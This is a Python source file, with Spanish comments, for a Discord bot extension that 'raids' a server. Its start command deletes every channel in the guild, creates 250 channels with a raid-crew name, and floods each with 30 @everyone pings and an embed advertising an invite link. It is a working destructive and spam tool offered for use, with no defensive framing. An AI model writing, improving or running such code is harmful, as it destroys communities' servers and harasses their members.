from discord.ext import commands
import discord
import asyncio

# URL de la imagen para el embed
EMBED_IMAGE_URL = 'https://media.discordapp.net/attachments/1287916745499349003/1287917692199768225/3a167c94ab96cf6d0f7c18e9c9e2b3dd.jpg?ex=66f34a52&is=66f1f8d2&hm=e3e12590c1af86720358b47586d6625043b1499f39f722de1a37c01086292898&=&format=webp'  # Agrega la URL de la imagen aquí

# Número de menciones que se enviarán en cada canal
MENTION_COUNT = 30

RESTRICTED_GUILDS = [123456789012345678, 987654321098765432]

def guild_restriction(restricted_guilds):
    def decorator(func):
        async def wrapper(ctx, *args, **kwargs):
            if ctx.guild.id in restricted_guilds:
                await ctx.send("Este comando no se puede ejecutar en este servidor.")
                return
            return await func(ctx, *args, **kwargs)
        return wrapper
    return decorator

class Start(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def start(self, ctx):
        guild = ctx.guild

        # Eliminar todos los canales existentes
        await self.delete_all_channels(guild)

        # Crear y enviar mensajes en múltiples canales en paralelo
        create_tasks = [self.create_channel_and_mention(guild, f'ᖇα͓̽i͎๔-Ᏸy͓̽-C͓̽ɾє͎ω͓̽-ֆ͓̽զƱ̽α͎๔') for i in range(250)]
        
        # Ejecutar tareas para crear canales en paralelo
        await asyncio.gather(*create_tasks)

    async def delete_all_channels(self, guild):
        channels = guild.channels
        
        for channel in channels:
            try:
                await channel.delete()
                print(f'Canal {channel.name} eliminado.')
            except discord.Forbidden:
                print(f'No se puede eliminar el canal {channel.name}. Permisos insuficientes.')
            except discord.HTTPException as e:
                print(f'Error al eliminar el canal {channel.name}: {e}')

    async def create_channel_and_mention(self, guild, channel_name):
        # Crear el canal
        channel = await guild.create_text_channel(channel_name)

        # Crear embed
        embed = discord.Embed(title='Crew raid', description='join discord.gg/bardo')
        embed.set_image(url=EMBED_IMAGE_URL)

        # Crear tareas para enviar menciones y embeds en paralelo
        mention_tasks = [channel.send('@everyone https://discord.gg/') for _ in range(MENTION_COUNT)]
        embed_task = channel.send(embed=embed)
        
        # Ejecutar las menciones y el embed
        await asyncio.gather(*mention_tasks)
        await embed_task

# Añadir el cog al bot
async def setup(bot):
    await bot.add_cog(Start(bot))
